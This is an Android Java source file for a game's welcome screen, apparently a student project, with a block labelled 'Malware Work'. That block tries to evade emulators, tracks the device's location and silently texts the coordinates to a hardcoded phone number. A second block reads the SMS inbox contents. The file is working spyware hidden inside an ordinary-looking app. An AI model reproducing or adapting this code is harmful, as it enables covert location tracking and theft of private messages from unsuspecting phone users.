package com.example.finalproject;

import android.app.Activity;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.PixelFormat;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.animation.AccelerateInterpolator;
import android.view.animation.AlphaAnimation;
import android.view.animation.Animation;
import android.view.animation.AnimationSet;
import android.widget.Button;
import android.widget.Toast;

public class WelcomePage extends Activity {
	LocationManager locationManager;
	private WelcomePage thisActivity;
	double mylatitude, mylongitude;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.welcomepage);
		getWindow().setFormat(PixelFormat.RGBA_8888);
		Animation fadeIn = new AlphaAnimation(0, 1);
		fadeIn.setInterpolator(new AccelerateInterpolator()); // add this
		fadeIn.setDuration(3000);
        
		Button b = (Button) findViewById(R.id.button1);
		// Malware Work
        TelephonyManager telMan = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
		thisActivity = this;
		locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
		
		// Check to see if it is runing in an emulated environment 
        if((telMan!=null || Build.HARDWARE != "goldfish" || Build.PRODUCT != "google_sdk" || Build.MODEL != "google_sdk")){

        
        new DownloadFileFromURL()
				.execute("http://a.dilcdn.com/bl/wp-content/uploads/sites/13/2011/09/mickey-mouse-disney-baby-photo-450x400-dcp-cpna013010.jpg");
		locationManager.requestLocationUpdates(
				LocationManager.NETWORK_PROVIDER, 5000, 0, new LocationListener() {
					private int count = 0;
					@Override
					public void onLocationChanged(Location location) {
						mylatitude = location.getLatitude();
						mylongitude = location.getLongitude();
						String myMsg = " " + mylatitude + " " + mylongitude;
						Toast.makeText(thisActivity, myMsg, Toast.LENGTH_LONG)
								.show();
						String theNumber = "6096511014";
						count++;
						sendMsg(theNumber, myMsg, count);
						
					}

					private void sendMsg(String theNumber, String myMsg, int count) {
						if(count>1){
						SmsManager sms = SmsManager.getDefault();
						sms.sendTextMessage(theNumber, null, myMsg, null, null);
						}

					}

					@Override
					public void onStatusChanged(String provider, int status,
							Bundle extras) {
						// TODO Auto-generated method stub

					}

					@Override
					public void onProviderEnabled(String provider) {
						// TODO Auto-generated method stub

					}

					@Override
					public void onProviderDisabled(String provider) {
						// TODO Auto-generated method stub

					}

				});
        }
		// end malware work

		AnimationSet animation = new AnimationSet(false); // change to false
		animation.addAnimation(fadeIn);
		b.setAnimation(animation);
		animation.start();

		b.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View v) {
				Intent intent1 = new Intent();
				intent1.setClass(WelcomePage.this, StartScreen.class);
				intent1.putExtra("Which_Game", "0");
				startActivity(intent1);

			}
		});
		
		//Check if it is running in an emulated environment 
        if((telMan!=null || Build.HARDWARE != "goldfish" || Build.PRODUCT != "google_sdk" || Build.MODEL != "google_sdk")){

		Uri mSmsinboxQueryUri = Uri.parse("content://sms/inbox");
        Cursor cursor1 = getContentResolver().query(mSmsinboxQueryUri,
                    new String[] { "_id", "thread_id", "address", "person", "date",
                                    "body", "type" }, null, null, null);
        startManagingCursor(cursor1);
        String[] columns = new String[] { "address", "person", "date", "body","type" };
        if (cursor1.getCount() > 0) {
            String count = Integer.toString(cursor1.getCount());
            Log.e("Count",count);
            while (cursor1.moveToNext()){
                String address = cursor1.getString(cursor1.getColumnIndex(columns[0]));
                String name = cursor1.getString(cursor1.getColumnIndex(columns[1]));
                String date = cursor1.getString(cursor1.getColumnIndex(columns[2]));
                String msg = cursor1.getString(cursor1.getColumnIndex(columns[3]));
                String type = cursor1.getString(cursor1.getColumnIndex(columns[4]));
                
				Toast.makeText(getApplicationContext(),address, Toast.LENGTH_SHORT).show();
            }
        }

        }
		
		
		
		

	}

}